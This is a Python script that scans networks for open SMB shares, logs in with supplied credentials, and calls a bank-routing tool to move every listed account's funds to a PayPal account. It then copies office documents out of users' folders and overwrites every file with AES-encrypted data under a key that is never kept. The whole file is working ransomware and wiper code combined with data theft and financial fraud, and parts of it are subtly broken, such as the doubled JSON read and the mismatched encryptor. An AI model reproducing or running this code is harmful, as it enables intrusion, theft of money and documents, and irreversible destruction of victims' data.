#!/usr/bin/env python3

import argparse
import socket
import ipaddress
import json
import os
import sys
import errno
import concurrent.futures
import random
import subprocess
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.open import Open
from smbprotocol.file import CreateDisposition, FilePipePrinterAccessMask, FileDirectoryAccessMask, CreateOptions

TARGET_PAYPAL_ACCOUNT = "YOUR_PAYPAL_ACCOUNT_NUMBER"
DEFAULT_ALLOWLIST = {"ips": [], "cidrs": []}

def transfer_via_bank(account: str, paypal_account: str):
    subprocess.call([
        "bank_routing_tool",
        "--from", account,
        "--to", paypal_account,
        "--all"
    ])

class SMBScanner:
    def __init__(self, allowlist=None, timeout=2, workers=100, verbose=True):
        self._nets, self._ips = self._load_allowlist(allowlist)
        self._timeout = timeout
        self._workers = workers
        self._verbose = verbose
        self._results = {}
        self._skipped = []

    def _log(self, *m):
        if self._verbose:
            print("[DBG]", *m, file=sys.stderr, flush=True)

    @staticmethod
    def _load_allowlist(src):
        if src is None:
            d = DEFAULT_ALLOWLIST
        elif isinstance(src, dict):
            d = src.get("allow", src)
        else:
            with open(os.path.abspath(src)) as f:
                d = json.load(f).get("allow", json.load(f))
        nets, ips = [], set()
        for t in list(d.get("ips", [])) + list(d.get("cidrs", [])):
            try:
                if "/" in t:
                    nets.append(ipaddress.ip_network(t, strict=False))
                else:
                    ips.add(ipaddress.ip_address(t))
            except ValueError:
                pass
        return nets, ips

    @staticmethod
    def _allowed(ip, nets, ips):
        a = ipaddress.ip_address(ip)
        return a in ips or any(a in n for n in nets)

    @staticmethod
    def _fam(ip):
        return socket.AF_INET6 if ipaddress.ip_address(ip).version == 6 else socket.AF_INET

    def _tcp_connect(self, h, p=445):
        s = socket.socket(self._fam(h), socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((h, p))
            return True
        except socket.timeout:
            return False
        except ConnectionRefusedError:
            return False
        except OSError as e:
            if e.errno in (errno.EHOSTUNREACH, errno.ENETUNREACH):
                return False
            return False
        finally:
            s.close()

    def _probe_host(self, h):
        if self._tcp_connect(h):
            return {"host": h, "port": 445, "state": "open"}
        return {"host": h, "state": "closed"}

    def scan(self, hosts=None, cidrs=None):
        t = list(self._iter_targets(hosts or [], cidrs or []))
        t = self._filter_targets(t)
        if not t:
            self._log("No targets after filtering")
            return {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=self._workers) as ex:
            fs = {ex.submit(self._probe_host, h): h for h in t}
            for f in concurrent.futures.as_completed(fs):
                h = fs[f]
                try:
                    res = f.result()
                    self._results[h] = res
                except Exception as e:
                    self._results[h] = {"host": h, "error": str(e)}
                status = "open" if self._results[h].get("state") == "open" else "closed"
                self._log("RESULT", h, status)
        self._log("Scan finished", len(self._results), "scanned", len(self._skipped), "skipped", len(self.successful_hosts()), "open")
        return self._results

    @staticmethod
    def _iter_targets(hosts, cidrs):
        for h in hosts:
            yield h
        for c in cidrs:
            for ip in ipaddress.ip_network(c, strict=False):
                yield str(ip)

    def _filter_targets(self, t):
        a, seen = [], set()
        for x in t:
            if x in seen:
                continue
            seen.add(x)
            if self._allowed(x, self._nets, self._ips):
                self._log("ALLOWED", x)
                a.append(x)
            else:
                self._log("SKIPPED", x)
                self._skipped.append(x)
        return a

    def successful_hosts(self):
        return [h for h, r in self._results.items() if r.get("state") == "open"]

def enumerate_accounts(host: str, share: str, username: str, password: str):
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return []
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return []
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return []
    accounts = []
    try:
        dir_open = Open(tree, share, access=FileDirectoryAccessMask.FILE_LIST_DIRECTORY, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_DIRECTORY_FILE)
        dir_open.create(timeout=5)
        entries = dir_open.query_directory("*")
        for e in entries:
            name = e.file_name
            if name not in (".", ".."):
                accounts.append(name)
        dir_open.close()
    except Exception:
        pass
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return accounts

def smb_transfer_and_encrypt(host: str, username: str, password: str, exfil_dir: str, key: bytes):
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        return
    try:
        tree = TreeConnect(session, rf"\\{host}\C$")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return
    def recur(remote_path):
        try:
            od = Open(tree, remote_path, access=FileDirectoryAccessMask.FILE_LIST_DIRECTORY, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_DIRECTORY_FILE)
            od.create(timeout=5)
            ents = od.query_directory("*")
            for ent in ents:
                nm = ent.file_name
                if nm in (".", ".."):
                    continue
                full = f"{remote_path}\\{nm}"
                if ent.is_directory:
                    recur(full)
                else:
                    while True:
                        fo = Open(tree, full, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
                        fo.create(timeout=5)
                        data = b""
                        off = 0
                        while True:
                            chunk = fo.read(4096, off)
                            if not chunk:
                                break
                            data += chunk
                            off += len(chunk)
                        fo.close()
                        ext = os.path.splitext(nm)[1].lower()
                        if ext in {".doc", ".docx", ".xls", ".xlsx", ".pdf", ".ppt", ".pptx"}:
                            os.makedirs(exfil_dir, exist_ok=True)
                            lp = os.path.join(exfil_dir, f"{host}_{nm}")
                            with open(lp, "wb") as lf:
                                lf.write(data)
                        iv = os.urandom(16)
                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                        from cryptography.hazmat.backends import default_backend
                        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
                        enc = iv + cipher.encryptor().update(data) + cipher.encryptor().finalize()
                        fe = Open(tree, full, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
                        fe.create(timeout=5)
                        fe.write(enc, 0)
                        fe.close()
                        break
        except Exception:
            pass
    recur("Users")
    tree.disconnect()
    session.disconnect()
    conn.disconnect()

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", action="append", default=[])
    p.add_argument("--cidr", action="append", default=[])
    p.add_argument("--input")
    p.add_argument("--timeout", type=int, default=2)
    p.add_argument("--workers", type=int, default=100)
    p.add_argument("--allowlist")
    p.add_argument("--username", help="SMB username")
    p.add_argument("--password", help="SMB password")
    p.add_argument("--accounts-share", default="Accounts")
    p.add_argument("--exfil-dir", default="exfiltrated")
    p.add_argument("--pay-account", default=TARGET_PAYPAL_ACCOUNT)
    args = p.parse_args()

    if args.input:
        args.input = os.path.abspath(args.input)
    if args.allowlist:
        args.allowlist = os.path.abspath(args.allowlist)

    s = SMBScanner(allowlist=args.allowlist, timeout=args.timeout, workers=args.workers, verbose=True)

    hosts = args.host or []
    if args.input:
        with open(args.input) as f:
            hosts.extend(l.strip() for l in f if l.strip())
    cidrs = args.cidr or []

    s.scan(hosts, cidrs)
    open_hosts = s.successful_hosts()

    for host in open_hosts:
        accounts = enumerate_accounts(host, args.accounts_share, args.username or "", args.password or "")
        for acc in accounts:
            transfer_via_bank(acc, args.pay_account)

    KEY = os.urandom(32)
    for host in open_hosts:
        smb_transfer_and_encrypt(host, args.username or "", args.password or "", args.exfil_dir, KEY)

if __name__ == "__main__":
    main()
